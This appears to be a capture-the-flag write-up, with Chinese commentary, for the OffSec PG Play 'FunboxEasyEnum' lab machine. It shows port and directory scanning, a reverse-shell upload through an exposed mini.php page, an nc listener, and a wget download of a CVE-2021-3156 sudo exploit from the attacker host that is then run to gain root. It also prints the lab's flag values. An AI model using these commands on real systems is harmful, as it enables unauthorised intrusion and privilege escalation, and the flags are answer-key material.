###### tags: `Offsec` `PG Play` `Easy` `Linux`

# FunboxEasyEnum
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.215.132 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.215.132:22
Open 192.168.215.132:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

要用大一點的字典掃
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gobuster dir -u http://192.168.203.132 -w /usr/share/wordlists/dirb/big.txt -x php
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.203.132/javascript/]
/mini.php             (Status: 200) [Size: 3828]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.203.132/phpmyadmin/]
/robots.txt           (Status: 200) [Size: 21]
/server-status        (Status: 403) [Size: 280]
Progress: 40938 / 40940 (100.00%)
===============================================================
Finished
===============================================================
```

查看`http://192.168.203.132/mini.php`可得一個上傳頁面，上傳reverseshell之後查看`http://192.168.203.132/shell.php`，在`/var/www`路徑得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001 

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox7:/$ 
www-data@funbox7:/var/www$ cat local.txt
8c3fd29524750ad9e566182b7e212a4c
```

使用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)，/root路徑有proof.txt
```
www-data@funbox7:/tmp$ wget 192.168.45.177/exploit_nss.py
www-data@funbox7:/tmp$ python3 exploit_nss.py
python3 exploit_nss.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@funbox7:/root# cat proof.txt
61707766dd310c5bd87df99828c3ae82
```